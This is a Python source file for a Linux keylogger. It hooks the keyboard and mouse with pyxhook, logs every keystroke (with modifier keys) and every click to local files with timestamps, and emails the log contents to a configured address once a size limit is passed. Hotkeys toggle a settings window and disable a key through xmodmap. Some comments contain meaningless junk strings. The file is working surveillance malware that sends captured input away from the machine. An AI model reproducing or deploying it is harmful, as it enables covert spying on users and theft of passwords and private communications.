from datetime import datetime

import sys
from PyQt5.QtWidgets import QApplication

from propertiesWindow import MyWin
import pyxhook
import os
import subprocess
import properties
from mailAdapter import MailAdapter

SHIFT_L = 50
SHIFT_R = 62

CONTROL_L = 37
CONTROL_R = 105

ALT_L = 64
ALT_R = 108

execKeys1 = [24, SHIFT_L]
execKeys2 = [43, SHIFT_L]

allModifs = {SHIFT_L : "SHIFT_L", SHIFT_R : "SHIFT_R", CONTROL_L : "CONTROL_L", CONTROL_R : "CONTROL_R", ALT_L : "ALT_L", ALT_R : "ALT_R"}

class HookManager:
    modifs = []
    oldStates = {}

    window = None
    settings = properties.load()#12
    hookman = None
    keylogFile = os.getcwd() + "/keylog.txt"
    mouselogFile = os.getcwd() + "/mouselog.txt"
    closechar = 49
    mailAd = MailAdapter()
    activeFlag = False
    def __init__(self):
        app = QApplication(sys.argv)
        self.window = MyWin()
        self.window.show()
        self.hookman = pyxhook.HookManager()

        # Define our callback to fire when a key is pressed downmfgshdgjf,jfgkjdgkjfhgzkjh768687687694754otu85789451
        self.hookman.KeyDown = self.keyEvent
        self.hookman.KeyUp = self.keyRelease
        # Hook the keyboard
        self.hookman.HookKeyboard()

        self.hookman.MouseAllButtonsDown = self.mouseEvent

        self.hookman.HookMouse()
        # Start our listenerasAQ
        self.hookman.start()
        self.activeFlag = True

        self.window.acceptSignal.connect(self.changeProp)

        sys.exit(app.exec_())


    def keyEvent(self, event):
        if event.ScanCode in allModifs.keys():
            self.modifs.append(event.ScanCode)
        else:
            s = ""
            for i in self.modifs:
                s += allModifs[i] + " + "
            fob = open(self.keylogFile, 'a')
            fob.write(s + str(event.ScanCode) + " - " + datetime.strftime(datetime.now(), "%d.%m.%Y %H:%M:%S"))
            print(s + str(event.ScanCode) + " - " + datetime.strftime(datetime.now(), "%d.%m.%Y %H:%M:%S"))
            fob.write('\n')
            fob.close()
            if (self.checkMod(execKeys1, event)):
                print("--------------------execute1")
                self.execute1()
            if (self.checkMod(execKeys2, event)):
                print("--------------------execute2")
                self.execute2()
            #if (event.ScanCode == )
            if event.Ascii == self.closechar:  # sa96 is the ascii of the grave key (`)sQQQQqQH
                self.settings.save()
                print("----STOP-----")
                self.hookman.cancel()
                self.activeFlag = False

        if (os.path.getsize(self.keylogFile) > self.settings.size):
            fob = open(self.keylogFile, "r+")
            text = fob.read()
            fob.close()
            self.mailAd.send(text, self.settings.address)
            fob = open(self.keylogFile, "w+")
            fob.close()
        return True

    def keyRelease(self, event):
        if (event.ScanCode in self.modifs):
            self.modifs.remove(event.ScanCode)


    def mouseEvent(self, event):
        fob = open(self.mouselogFile, 'a')
        fob.write(event.MessageName)
        fob.write(" pos")
        fob.write(str(event.Position) + " - " + datetime.strftime(datetime.now(), "%d.%m.%Y %H:%M:%S"))
        fob.write('\n')
        fob.close()
        print(event)
        if (os.path.getsize(self.mouselogFile) > self.settings.size):
            fob = open(self.mouselogFile, "r+")#QQQQ
            text = fob.read()
            fob.close()
            self.mailAd.send(text, self.settings.address)
            fob = open(self.mouselogFile, "w+")
            fob.close()
        return True

    def isactive(self):
        return self.activeFlag

    def checkMod(self, keys, event):
        return (event.ScanCode == keys[0] and (self.modifs == list(set(keys[1:]) & set(self.modifs))))

    def execute1(self):
        if (self.window.isHidden()):#QeeeQQ
            self.window.show()
            print(self.oldStates)
            self.block("26")
        else:
            self.window.hide()
            print(self.oldStates)
            self.unblock("26")

    def execute2(self):
        subprocess.call("ls > " + os.getcwd() + "/tem.txt", shell=True)
        file = open(os.getcwd() + "/tem.txt", "r+")
        print(file.read())
        file.close()

    def changeProp(self, propert):
        print(propert)
        self.settings = propert

    def block(self, scanCode):#QQQWQQQQ
        if (not (scanCode in self.oldStates.keys())):
            subprocess.call("xmodmap -pke > " + os.getcwd() + "/map.txt", shell=True)
            mapFile = open(os.getcwd() + "/map.txt")
            text = mapFile.readlines()
            print(text)
            mapFile.close()
            for line in text:
                code = line.split(r"=")
                print(code)
                if (str(scanCode) in code[0]):
                    print("-------------1111111111111111111111---------------------------------")
                    print(line)
                    print(code[1])
                    self.oldStates.update({scanCode:code[1]})
                    break
        subprocess.call("xmodmap -e \"keycode " + scanCode + " = " + "NoSymbol NoSymbol NoSymbol NoSymbol NoSymbol\"", shell=True)

    def unblock(self, scanCode):
        if (scanCode in self.oldStates.keys()):
            subprocess.call("xmodmap -e \"keycode " + scanCode + " = " + self.oldStates[scanCode] +"\"", shell=True)